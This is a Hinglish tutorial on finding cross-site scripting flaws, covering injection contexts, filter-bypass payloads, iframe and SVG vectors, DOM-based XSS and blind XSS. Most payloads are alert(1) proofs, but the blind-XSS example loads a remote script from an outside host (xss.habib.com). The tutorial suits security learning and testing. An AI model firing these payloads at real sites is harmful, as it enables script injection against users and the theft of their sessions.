Hacker Plan" (10 Steps)

### ✅ Step 1: XSS ka DNA — Reflection + Execution

XSS hone ke liye do cheezein zaroori hain:

- Reflection → Tumhara input page pe visible ya hidden form mein aaya

- Execution → Browser ne us input ko text nahi, code samjha

### 🧠 Tip:

Agar input sirf dikh rahi hai (text), to XSS nahi
Agar input JS ki tarah run ho rahi hai — boom! Alert chala to XSS confirmed!

---

### ✅ Step 2: 6 Contexts Jahan XSS hota hai

| Context Name            | Example Reflection              | XSS Payload                 |
| ----------------------- | ------------------------------- | --------------------------- |
| HTML                    | `<div>input_here</div>`         | `<script>alert(1)</script>` |
| Attribute               | `<img src="input_here">`        | `x" onerror="alert(1)`      |
| JS Context              | `var a = "input_here";`         | `";alert(1);//`             |
| URL                     | `<a href="input_here">`         | `javascript:alert(1)`       |
| Event Handler           | `<button onclick="input_here">` | `alert(1)`                  |
| Comment / Style / Title | `<!-- input_here -->`           | XSS not possible mostly     |


🧠 Tip:
Pehle inspect karo ya page source check karo — kis context mein input reflect ho rahi hai, uske hisaab se payload banao.

---

### ✅ Step 3: Bypass Techniques

| Bypass Type        | Payload Example                                                        |
| ------------------ | ---------------------------------------------------------------------- |
| Tag-based          | `<svg/onload=alert(1)>`, `<iframe srcdoc="<script>alert(1)</script>">` |
| Encoding           | `%3Cscript%3Ealert(1)%3C/script%3E`                                    |
| Broken Tags        | `<scr<script>ipt>alert(1)</scr<script>ipt>`                            |
| Event Bypass       | `autofocus onfocus=alert(1)`                                           |
| Attribute Breaking | `x" onmouseover="alert(1)`                                             |
| HTML Entity        | `&lt;svg/onload=alert(1)&gt;`                                          |

Tip:

Jab <script> block ho, to svg, iframe, math, img, input, body, details, select — sab test kar.

---

### ✅ Step 4: IFRAME ka Use XSS mein
📌 Purpose:
Hidden XSS run karne ke liye

Other payloads inject karne ke liye (CSP bypass / clickjacking etc.)

✅ Example Payload:

```<iframe srcdoc="<script>alert('XSS')</script>"></iframe>```

srcdoc iframe ka andar ka HTML define karta hai

Yahan <script> tag directly run hota hai

🧠 Note:

iframe payloads mostly HTML context mein use hote hain — ya jab normal tags block ho jaayein

---

### ✅ Step 5: SVG ka Use XSS mein
📌 Purpose:
<script> tag block ho to alternate route

SVG browser ke liye trusted hota hai (graphics tag hai)

---

### Step 6: DOM-Based XSS Samajh
📌 Jab JS code input uthakar page mein inject karta hai

🔍 Jaise:

```let q = location.hash;
document.getElementById("result").innerHTML = q;```

✅ Exploit:

```http://example.com/#<img src=x onerror=alert(1)>```

🧠 DOM XSS ka source hota hai: location, location.hash, document.referrer, etc.

---

### ✅ Step 7: Blind XSS

📌 Jab tu payload daale, alert tere samne nahi chalta — lekin backend user (admin) ke saamne chalta hai.

Example Payload:

```<script src=//xss.habib.com/x.js></script>```

🧠 Use tools like XSSHunter, Interactsh, ya apna webhook.site

---

### ✅ Step 8: XSS Detection via BurpSuite

- Intercept request
- Send to Repeater
- **Inject payloads in:**

- Query parameters
- Headers (User-Agent, Referer)
- POST body
- Cookies
- Check Reflection

Match context → fire payload

---
